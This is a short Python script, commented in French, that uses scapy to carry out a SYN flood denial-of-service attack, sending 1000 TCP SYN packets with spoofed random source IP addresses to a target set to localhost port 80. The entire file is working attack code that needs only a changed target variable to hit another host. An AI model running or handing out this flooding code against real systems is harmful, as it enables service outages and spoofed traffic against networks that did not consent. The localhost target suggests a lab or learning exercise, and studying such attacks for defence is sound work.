from scapy.all import *

# Définition de la fonction d'attaque SYN flood
class ENVOIS:
    def syn(cible, port, nbrpaquet):
        # Boucle  envois
        for _ in range(nbrpaquet):
            # Création du paquet SYN avec une adresse IP source aléatoire et un numéro de port source aléatoire
            ip = IP(dst=cible, src=RandIP())  # adresse IP source aléatoire
            tcpsyn = TCP(dport=port, flags="S")  # paquet TCP avec le flag SYN
            # Envoie paquet
            send(ip/tcpsyn,  verbose=False) #verbose en false assure que je attend pas de reponse

# paramètres de testes
cible= "127.0.0.1"  # cible
port= 80  # Port 
nbrpaquet = 1000  # nbr envois

ENVOIS.syn(cible, port, nbrpaquet)